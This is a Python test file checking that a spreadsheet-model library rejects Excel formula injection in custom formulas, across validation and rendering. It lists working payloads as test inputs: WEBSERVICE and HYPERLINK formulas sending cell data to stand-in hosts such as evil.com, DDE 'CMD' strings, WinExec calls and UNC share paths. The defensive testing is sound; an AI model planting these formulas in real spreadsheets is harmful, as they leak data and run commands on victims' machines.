"""Tests for Excel formula injection protection."""

import pytest
from hypothesis import given
from hypothesis import strategies as st

from excel_model.exceptions import FormulaInjectionError
from excel_model.formula_engine import CellContext, render_formula
from excel_model.spec import InputsDef, LineItemDef, MetadataDef, ModelSpec
from excel_model.validator import validate_custom_formula, validate_spec


def make_ctx() -> CellContext:
    return CellContext(
        period_index=2,
        n_history=2,
        row=10,
        col=4,
        col_letter="D",
        prior_col_letter="C",
        named_ranges={},
        row_map={"revenue": 10},
        inputs_row_map={},
        scenario_prefix="",
        first_proj_col_letter="D",
        last_proj_col_letter="H",
        entity_col_range="",
        driver_names=frozenset(),
    )


def make_spec_with_custom_formula(formula: str) -> ModelSpec:
    li = (
        LineItemDef(
            key="custom_item",
            label="Custom",
            formula_type="custom",
            formula_params={"formula": formula},
            is_subtotal=False,
            is_total=False,
            section="",
            format="",
        ),
    )
    return ModelSpec(
        model_type="p_and_l",
        title="Test",
        currency="CHF",
        granularity="annual",
        start_period="2025",
        n_periods=3,
        n_history_periods=0,
        assumptions=(),
        drivers=(),
        line_items=li,
        metadata=MetadataDef(preparer="", date="", version="1.0"),
        scenarios=(),
        column_groups=(),
        inputs=InputsDef(source="", period_col="period", sheet="", value_cols={}),
        entities=(),
    )


class TestValidateCustomFormula:
    """Test validate_custom_formula rejects dangerous patterns."""

    @pytest.mark.parametrize(
        "formula",
        [
            '=WEBSERVICE("http://attacker.com/?d="&A1)',
            "=webservice('http://evil.com')",
            '=IMPORTDATA("http://evil.com/data.csv")',
            "=importdata('http://evil.com')",
            '=IMPORTFEED("http://evil.com/rss")',
            '=IMPORTHTML("http://evil.com","table",1)',
            '=IMPORTRANGE("http://evil.com","Sheet1!A1")',
            '=IMPORTXML("http://evil.com","//a")',
            '=FILTERXML(WEBSERVICE("http://evil.com"),"//a")',
            '=CALL("kernel32","WinExec","JCJ","calc.exe",5)',
            '=REGISTER.ID("kernel32","WinExec","JCJ")',
            '=EXEC("calc.exe")',
            '=HYPERLINK("https://attacker.example.com/?d="&A1,"click here")',
            '=hyperlink("https://evil.com","link")',
            '=RTD("progid",,"topic1")',
            '=INDIRECT("[http://attacker.example.com/evil.xlsx]Sheet1!A1")',
            '=indirect("[http://evil.com/x.xlsx]Sheet1!A1")',
            '=ENCODEURL("http://evil.com/?d="&A1)',
            '=encodeurl("http://evil.com")',
        ],
        ids=[
            "WEBSERVICE_upper",
            "webservice_lower",
            "IMPORTDATA_upper",
            "importdata_lower",
            "IMPORTFEED",
            "IMPORTHTML",
            "IMPORTRANGE",
            "IMPORTXML",
            "FILTERXML",
            "CALL",
            "REGISTER_ID",
            "EXEC",
            "HYPERLINK_upper",
            "hyperlink_lower",
            "RTD",
            "INDIRECT_upper",
            "indirect_lower",
            "ENCODEURL_upper",
            "encodeurl_lower",
        ],
    )
    def test_rejects_dangerous_functions(self, formula: str) -> None:
        with pytest.raises(FormulaInjectionError):
            validate_custom_formula(formula, "test_item")

    @pytest.mark.parametrize(
        "formula",
        [
            "=CMD|'/c calc'!A0",
            '=DDE("cmd","/c calc","")',
            '=DDEAUTO("cmd","/c calc","")',
        ],
        ids=["CMD_pipe", "DDE_function", "DDEAUTO"],
    )
    def test_rejects_dde_patterns(self, formula: str) -> None:
        with pytest.raises(FormulaInjectionError):
            validate_custom_formula(formula, "test_item")

    @pytest.mark.parametrize(
        "formula",
        [
            r"='\\attacker\share\evil.xlsx'!A1",
            r"='\\192.168.1.1\share\data.xlsx'!A1",
        ],
        ids=["UNC_hostname", "UNC_ip"],
    )
    def test_rejects_unc_paths(self, formula: str) -> None:
        with pytest.raises(FormulaInjectionError, match="UNC path"):
            validate_custom_formula(formula, "test_item")

    @pytest.mark.parametrize(
        "formula",
        [
            "={col_letter}${revenue_row}*1.1",
            "=SUM({col_letter}$5:{col_letter}$10)",
            "=A1+B1",
            "=IF(A1>0,A1*1.1,0)",
            "=ROUND(A1,2)",
            "=MAX(A1:A10)",
        ],
        ids=[
            "row_ref_template",
            "sum_template",
            "simple_add",
            "if_formula",
            "round",
            "max",
        ],
    )
    def test_allows_safe_formulas(self, formula: str) -> None:
        validate_custom_formula(formula, "test_item")

    def test_error_message_includes_line_item_key(self) -> None:
        with pytest.raises(FormulaInjectionError, match="my_item"):
            validate_custom_formula('=WEBSERVICE("http://evil.com")', "my_item")

    def test_error_message_includes_formula(self) -> None:
        with pytest.raises(FormulaInjectionError, match="WEBSERVICE"):
            validate_custom_formula('=WEBSERVICE("http://evil.com")', "test")


class TestValidateSpecCustomFormulaInjection:
    """Test that validate_spec catches injection in custom formulas."""

    def test_spec_validation_catches_dangerous_formula(self) -> None:
        spec = make_spec_with_custom_formula('=WEBSERVICE("http://evil.com")')
        errors = validate_spec(spec)
        assert any("dangerous pattern" in e for e in errors)

    def test_spec_validation_catches_dde_pipe(self) -> None:
        spec = make_spec_with_custom_formula("=CMD|'/c calc'!A0")
        errors = validate_spec(spec)
        assert any("dangerous" in e.lower() or "DDE" in e or "pipe" in e.lower() for e in errors)

    def test_spec_validation_allows_safe_formula(self) -> None:
        spec = make_spec_with_custom_formula("=A1+B1*1.1")
        errors = validate_spec(spec)
        # Should have no injection-related errors
        assert not any("dangerous" in e.lower() or "dde" in e.lower() for e in errors)


class TestRenderFormulaCustomInjection:
    """Test that render_formula rejects dangerous custom formulas (defense-in-depth)."""

    def test_render_formula_rejects_webservice(self) -> None:
        ctx = make_ctx()
        with pytest.raises(FormulaInjectionError):
            render_formula(
                "custom",
                {"formula": '=WEBSERVICE("http://evil.com")', "_line_item_key": "x"},
                ctx,
            )

    def test_render_formula_rejects_dde(self) -> None:
        ctx = make_ctx()
        with pytest.raises(FormulaInjectionError):
            render_formula(
                "custom",
                {"formula": "=CMD|'/c calc'!A0", "_line_item_key": "x"},
                ctx,
            )

    def test_render_formula_allows_safe_custom(self) -> None:
        ctx = make_ctx()
        result = render_formula(
            "custom",
            {"formula": "={col_letter}${revenue_row}*1.1"},
            ctx,
        )
        assert result == "=D$10*1.1"


class TestFormulaInjectionProperty:
    """Property-based tests for formula injection validation."""

    @given(
        st.lists(
            st.sampled_from(["SUM", "IF", "ROUND", "MAX", "MIN", "ABS", "AVERAGE"]),
            min_size=1,
            max_size=3,
        ),
        st.lists(st.integers(min_value=1, max_value=999), min_size=1, max_size=4),
    )
    def test_safe_function_formulas_never_rejected(self, funcs: list[str], nums: list[int]) -> None:
        """Formulas built from known-safe Excel functions and cell refs must not raise."""
        refs = [f"A{n}" for n in nums]
        inner = ",".join(refs)
        formula = "=" + "+".join(f"{f}({inner})" for f in funcs)
        validate_custom_formula(formula, "prop_test")

    @given(
        st.lists(st.integers(min_value=1, max_value=999), min_size=2, max_size=6),
        st.lists(
            st.sampled_from(["+", "-", "*", "/"]),
            min_size=1,
            max_size=5,
        ),
    )
    def test_pure_arithmetic_never_rejected(self, nums: list[int], ops: list[str]) -> None:
        """Formulas with only cell refs and arithmetic operators must not raise."""
        parts: list[str] = []
        for i, n in enumerate(nums):
            parts.append(f"A{n}")
            if i < len(ops):
                parts.append(ops[i])
        formula = "=" + "".join(parts)
        validate_custom_formula(formula, "prop_test")


class TestFormulaInjectionEndToEnd:
    """End-to-end: spec validation + render both block injection."""

    def test_dangerous_formula_blocked_at_validation_and_render(self) -> None:
        """A dangerous formula is caught by validate_spec and also by render_formula."""
        dangerous = '=WEBSERVICE("http://evil.com")'
        spec = make_spec_with_custom_formula(dangerous)

        # Layer 1: spec validation catches it
        errors = validate_spec(spec)
        assert any("dangerous pattern" in e for e in errors)

        # Layer 2: render_formula also catches it (defense-in-depth)
        ctx = make_ctx()
        with pytest.raises(FormulaInjectionError):
            render_formula(
                "custom",
                {"formula": dangerous, "_line_item_key": "custom_item"},
                ctx,
            )

    def test_safe_formula_passes_validation_and_renders(self) -> None:
        """A safe formula passes both validation and rendering."""
        safe = "={col_letter}$10*1.1"
        spec = make_spec_with_custom_formula(safe)

        errors = validate_spec(spec)
        assert not any("dangerous" in e.lower() or "dde" in e.lower() for e in errors)

        ctx = make_ctx()
        result = render_formula("custom", {"formula": safe}, ctx)
        assert result == "=D$10*1.1"
